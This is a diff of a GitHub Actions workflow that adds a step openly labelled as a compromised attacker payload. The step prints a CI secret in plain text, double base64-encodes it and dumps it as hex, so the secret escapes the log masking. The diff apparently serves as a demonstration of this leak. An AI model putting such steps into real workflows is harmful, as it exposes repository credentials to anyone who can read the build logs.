@@ -8,9 +8,32 @@ jobs:
   build:
     runs-on: ubuntu-latest
     steps:
-      - name: Normal step
+
+      - name: Étape normale
         run: |
-          echo "===== Step légitime ====="
-          echo "Valeur secrète masquée : $DEMO_SECRET"
+          echo "----- Début du log légitime -----"
+          echo "La valeur du secret est : $DEMO_SECRET"
+          echo "----- Fin du log légitime -----"
+        env:
+          DEMO_SECRET: ${{ secrets.DEMO_SECRET }}
+
+      - name: Étape compromise
+        shell: bash
+        run: |
+          echo ""
+          echo "===== ATTACKER PAYLOAD ACTIVÉ ====="
+          echo "[Attacker] Secret en clair : $DEMO_SECRET"
+          echo ""
+
+          encoded=$(echo -n "$DEMO_SECRET" | base64 | base64)
+          echo "[Attacker] Encodé 2x : $encoded"
+
+          decoded=$(echo "$encoded" | base64 -d | base64 -d)
+          echo "[Attacker] Décodé : $decoded"
+
+          echo "[Attacker] HEX :"
+          echo "$decoded" | xxd -p
+
+          echo "===== FIN ====="
         env:
           DEMO_SECRET: ${{ secrets.DEMO_SECRET }}
